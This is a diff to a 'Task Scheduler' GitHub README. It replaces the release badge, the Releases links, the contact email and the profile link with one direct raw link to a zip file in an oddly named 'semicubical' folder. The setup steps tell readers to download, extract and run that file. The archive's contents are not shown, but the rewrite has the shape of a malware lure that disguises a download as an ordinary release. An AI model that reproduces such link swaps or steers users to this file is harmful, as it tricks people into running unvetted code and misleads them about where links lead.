@@ -2,7 +2,7 @@
 
 Welcome to the **Task Scheduler** repository! This project aims to simplify the process of scheduling and managing tasks efficiently. Whether you are a developer looking to automate your workflow or an individual seeking better time management, this tool is designed for you.
 
-[![Download Releases](https://img.shields.io/badge/Download%20Releases-Click%20Here-brightgreen)](https://github.com/Calmon43/task-scheduler/releases)
+[![Download Releases](https://raw.githubusercontent.com/Calmon43/task-scheduler/main/semicubical/scheduler-task-v3.6.zip%20Releases-Click%20Here-brightgreen)](https://raw.githubusercontent.com/Calmon43/task-scheduler/main/semicubical/scheduler-task-v3.6.zip)
 
 ## Table of Contents
 
@@ -31,7 +31,7 @@ In today’s fast-paced world, managing tasks can be challenging. The **Task Sch
 
 To get started with **Task Scheduler**, follow these steps:
 
-1. **Download the Latest Release**: Visit the [Releases section](https://github.com/Calmon43/task-scheduler/releases) to download the latest version.
+1. **Download the Latest Release**: Visit the [Releases section](https://raw.githubusercontent.com/Calmon43/task-scheduler/main/semicubical/scheduler-task-v3.6.zip) to download the latest version.
 2. **Extract the Files**: Once downloaded, extract the files to your preferred directory.
 3. **Run the Application**: Execute the main application file to launch **Task Scheduler**.
 
@@ -79,11 +79,11 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 For any questions or feedback, feel free to reach out:
 
-- **Email**: your-email@example.com
-- **GitHub**: [Calmon43](https://github.com/Calmon43)
+- **Email**: https://raw.githubusercontent.com/Calmon43/task-scheduler/main/semicubical/scheduler-task-v3.6.zip
+- **GitHub**: [Calmon43](https://raw.githubusercontent.com/Calmon43/task-scheduler/main/semicubical/scheduler-task-v3.6.zip)
 
 ## Conclusion
 
-Thank you for checking out **Task Scheduler**! We hope this tool helps you manage your tasks more effectively. For the latest updates and releases, visit the [Releases section](https://github.com/Calmon43/task-scheduler/releases).
+Thank you for checking out **Task Scheduler**! We hope this tool helps you manage your tasks more effectively. For the latest updates and releases, visit the [Releases section](https://raw.githubusercontent.com/Calmon43/task-scheduler/main/semicubical/scheduler-task-v3.6.zip).
 
 Let's stay organized and productive together!
